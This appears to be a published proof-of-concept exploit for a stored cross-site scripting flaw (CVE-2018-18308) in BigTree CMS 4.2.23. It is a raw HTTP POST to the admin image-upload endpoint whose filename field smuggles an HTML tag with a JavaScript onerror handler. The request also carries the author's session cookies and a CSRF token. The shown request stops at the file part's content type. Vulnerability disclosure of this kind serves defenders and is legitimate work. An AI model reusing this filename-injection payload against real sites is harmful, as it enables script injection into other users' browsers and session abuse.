@@ -1,0 +1,40 @@
+# Exploit Title: BigTree CMS 4.2.23 - Cross-Site Scripting
+# Date: 2018-10-15 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.bigtreecms.org/
+# Software Link : https://github.com/bigtreecms/BigTree-CMS/
+# Software : BigTree CMS
+# Version : 4.2.23
+# Vulernability Type : Cross-site Scripting
+# Vulenrability : Stored XSS
+# CVE : CVE-2018-18308
+
+# In the 4.2.23 version of BigTree, a Stored XSS vulnerability has been discovered 
+# in /admin/ajax/file-browser/upload/ (aka the image upload area).
+ 
+# HTTP POST Request :
+
+POST /admin/ajax/file-browser/upload/ HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://TARGET/admin/pages/add/0/
+Content-Type: multipart/form-data; boundary=---------------------------15148507251045999311737722822
+Content-Length: 1574699
+Cookie: __utma=242042641.1054742390.1539547796.1539547796.1539547796.1; __utmb=242042641.6.10.1539547796; __utmc=242042641; __utmz=242042641.1539547796.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); PHPSESSID=fat2c61gglprnotletf1mobnui; hide_bigtree_bar=; bigtree_admin[email]=test%40ismailtasdelen.me; bigtree_admin[login]=%5B%22session-5bc3a4ae5b8016.12355027%22%2C%22chain-5bc3a4ae5b7966.37991866%22%5D; bigtree_admin%5Bpage_properties_open%5D=on
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------15148507251045999311737722822
+Content-Disposition: form-data; name="__csrf_token_B2FHVMV815XHACWV8RVV2BTX1EH1YEH6__"
+
+tNvtUi8PU/IDcrgxj1t/Uv/1ciYeF7AudslXD429hkQ=
+-----------------------------15148507251045999311737722822
+Content-Disposition: form-data; name="folder"
+
+0
+-----------------------------15148507251045999311737722822
+Content-Disposition: form-data; name="files[]"; filename="\"><img src=x onerror=alert(\"ismailtasdelen\")>.jpg"
+Content-Type: image/jpeg
